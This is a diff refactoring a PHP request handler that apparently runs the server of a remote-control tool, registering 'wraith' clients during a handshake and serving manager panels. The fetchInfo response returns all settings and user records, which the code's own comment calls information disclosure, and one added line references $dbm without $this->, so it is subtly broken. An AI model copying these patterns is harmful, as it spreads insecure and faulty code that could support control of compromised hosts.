@@ -5,23 +5,19 @@
 class Handler_proto_v_0 {
 
     // Handler properties
-    private $db; // Copy of the database connection
+    private $dbm; // Copy of the database manager instance
     private $cType; // Who the request is from
     private $cAddress; // The IP address of the client
     private $cData; // The data to be processed
-    private $SETTINGS; // A copy of the API settings
-    private $API_USERS; // A copy of the API users
     private $response = []; // The response dict sent when responding
 
-    function __construct($db, $clientType, $clientAddress, $clientData, $SETTINGS, $API_USERS) {
+    function __construct($dbm, $clientType, $clientAddress, $clientData) {
 
         // Copy args to private properties
-        $this->db = $db;
+        $this->dbm = $dbm;
         $this->cType = $clientType;
         $this->cAddress = $clientAddress;
         $this->cData = $clientData;
-        $this->SETTINGS = $SETTINGS;
-        $this->API_USERS = $API_USERS;
 
     }
 
@@ -38,7 +34,7 @@ class Handler_proto_v_0 {
 
         // If the handler was created, the client has passed all checks
         // so it is safe to add the API fingerprint to the response
-        $this->response["APIFingerprint"] = $this->SETTINGS["APIFingerprint"];
+        $this->response["APIFingerprint"] = $this->dbm->dbGetSetting(["key" => ["APIFingerprint"]])["APIFingerprint"];
 
         // Determine if the client is a manager or Wraith
         if ($this->cType === "wraith") {
@@ -48,8 +44,7 @@ class Handler_proto_v_0 {
             // Wraith is logging in
             if ($this->cData["reqType"] === "handshake") {
 
-                // Update relevant statistics
-                dbUpdateStat("totalWraithConnections", dbGetStats()["totalWraithConnections"] + 1);
+                // TODO create wraith join event
 
                 // Ensure that the required fields are present in the request
                 if (
@@ -88,7 +83,7 @@ class Handler_proto_v_0 {
                 $this->cData["hostInfo"]["fingerprint"] = ""; // TODO
 
                 // Create a database entry for the Wraith
-                dbAddWraith([
+                $this->dbm->dbAddWraith([
                     "assignedID" => uniqid(),
                     "hostProperties" => json_encode($this->cData["hostInfo"]),
                     "wraithProperties" => json_encode($this->cData["wraithInfo"]),
@@ -102,7 +97,7 @@ class Handler_proto_v_0 {
 
                 // Add an encryption key switch command to switch to a
                 // more secure, non-hard-coded encryption key
-                $this->response["switchKey"] = $this->SETTINGS["wraithSwitchCryptKey"];
+                $this->response["switchKey"] = $dbm->dbGetSetting(["key" => ["wraithSwitchCryptKey"]])["wraithSwitchCryptKey"];
 
                 // Respond
                 return;
@@ -131,23 +126,23 @@ class Handler_proto_v_0 {
             // Manager
 
             // Update the session last heartbeat time
-            dbUpdateSessionLastHeartbeat($this->cData["sessionID"]);
+            $this->dbm->dbUpdateSessionLastHeartbeat($this->cData["sessionID"]);
 
             // The panel is requesting general information
             if ($this->cData["reqType"] === "fetchInfo") {
 
                 // Get necessary variables
                 $sessionID = $this->cData["sessionID"];
-                $session = dbGetSessions()[$sessionID];
+                $session = $this->dbm->dbGetSessions(["assignedID" => [$sessionID]])[$sessionID];
 
                 $this->response["data"] = [
                     "APIVersion" => constant("API_VERSION"),
                     "sessionUsername" => $session["username"],
-                    "activeWraiths" => sizeof(dbGetWraiths()),
-                    // This is a lot of information disclosure if someone
-                    // unauthenticated is able to fetch it
-                    "settings" => $this->SETTINGS,
-                    "users" => $this->API_USERS,
+                    "activeWraiths" => sizeof($this->dbm->dbGetWraiths()),
+                    // The following is a lot of information disclosure if someone
+                    // unauthenticated is able to fetch it. Be careful!
+                    "settings" => $this->dbm->dbGetSetting(),
+                    "users" => $this->dbm->dbGetUsers(),
                 ];
                 $this->response["status"] = "SUCCESS";
                 return;
